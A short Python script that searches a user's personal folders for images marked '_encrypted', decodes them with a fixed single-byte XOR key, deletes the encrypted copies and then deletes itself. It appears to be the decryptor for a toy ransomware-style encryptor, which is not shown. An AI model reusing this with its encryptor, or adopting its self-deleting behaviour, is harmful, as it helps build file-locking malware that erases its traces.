import os

# Directories to search for encrypted image files
directories = ['Desktop', 'Downloads', 'Documents', 'Pictures']

# Key for decryption (should match the encryption key used)
key = 48

# Decrypt function
def decrypt_file(file_path):
    try:
        with open(file_path, 'rb') as file:
            image = bytearray(file.read())
        
        # Decrypting the image
        for i, j in enumerate(image):
            image[i] = j ^ key
        
        # Creating the new decrypted image
        decrypted_path = os.path.splitext(file_path)[0] + '_decrypted' + os.path.splitext(file_path)[1]
        with open(decrypted_path, 'wb') as file:
            file.write(image)
        
        # Deleting the encrypted image
        os.remove(file_path)
        
        print(f"Decrypted file: {file_path}")
    
    except IOError:
        print(f"Failed to decrypt file: {file_path}")

# Iterate through directories and decrypt image files
for directory in directories:
    for root, dirs, files in os.walk(os.path.expanduser('~/' + directory)):
        for file in files:
            if file.lower().endswith(('_encrypted.jpg', '_encrypted.png')):
                file_path = os.path.join(root, file)
                decrypt_file(file_path)

# Deleting the program file
os.remove(__file__)
print("Program self-deleted.")
